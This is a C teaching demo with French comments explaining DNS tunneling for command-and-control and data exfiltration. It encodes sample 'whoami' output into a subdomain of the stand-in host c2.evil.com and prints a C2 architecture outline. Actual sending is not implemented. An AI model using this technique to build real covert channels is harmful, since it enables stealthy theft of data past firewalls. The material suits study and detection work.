/*
 * OBJECTIF  : Communication C2 via DNS (tunneling, exfiltration)
 * PREREQUIS : DNS basics, Winsock
 * COMPILE   : cl example.c /Fe:example.exe /link ws2_32.lib dnsapi.lib
 *
 * Le DNS est rarement filtre. On encode les donnees dans les sous-domaines
 * et on recoit les commandes via les reponses TXT/A.
 */

#include <windows.h>
#include <windns.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "dnsapi.lib")

static const char b32[] = "abcdefghijklmnopqrstuvwxyz234567";

void base32_encode(const BYTE* data, int len, char* out) {
    int i = 0, j = 0, bits = 0, buf = 0;
    while (i < len) {
        buf = (buf << 8) | data[i++]; bits += 8;
        while (bits >= 5) { bits -= 5; out[j++] = b32[(buf >> bits) & 0x1F]; }
    }
    if (bits > 0) out[j++] = b32[(buf << (5 - bits)) & 0x1F];
    out[j] = '\0';
}

void demo_dns_query(void) {
    printf("[1] Requete DNS avec DnsQuery_A\n\n");
    DNS_RECORDA* rec = NULL;
    if (DnsQuery_A("www.google.com", DNS_TYPE_A, DNS_QUERY_STANDARD, NULL,
                    (PDNS_RECORD*)&rec, NULL) == 0 && rec) {
        DNS_RECORDA* p = rec;
        while (p) {
            if (p->wType == DNS_TYPE_A) {
                IN_ADDR a; a.S_un.S_addr = p->Data.A.IpAddress;
                printf("    [+] A: %d.%d.%d.%d\n", a.S_un.S_un_b.s_b1,
                       a.S_un.S_un_b.s_b2, a.S_un.S_un_b.s_b3, a.S_un.S_un_b.s_b4);
            }
            p = p->pNext;
        }
        DnsRecordListFree(rec, DnsFreeRecordList);
    }
    printf("\n");
}

void demo_dns_encode(void) {
    printf("[2] Encodage de donnees dans un sous-domaine\n\n");
    const char* data = "whoami output";
    char enc[256] = {0};
    base32_encode((const BYTE*)data, (int)strlen(data), enc);
    printf("    Donnee   : %s\n", data);
    printf("    Base32   : %s\n", enc);
    printf("    Requete  : %s.c2.evil.com\n\n", enc);
}

void demo_architecture(void) {
    printf("[3] Architecture DNS C2\n\n");
    printf("    Beacon -> DNS resolver -> C2 DNS autoritatif\n");
    printf("    Commandes : via TXT records (max 255 chars)\n");
    printf("    Donnees   : via sous-domaines encodes\n\n");
    printf("    Avantage : passe les firewalls restrictifs\n");
    printf("    Inconvenient : tres lent, detectable par frequence\n\n");
}

int main(void) {
    printf("[*] Demo : DNS Communication C2\n");
    printf("[*] ==========================================\n\n");
    demo_dns_query();
    demo_dns_encode();
    demo_architecture();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
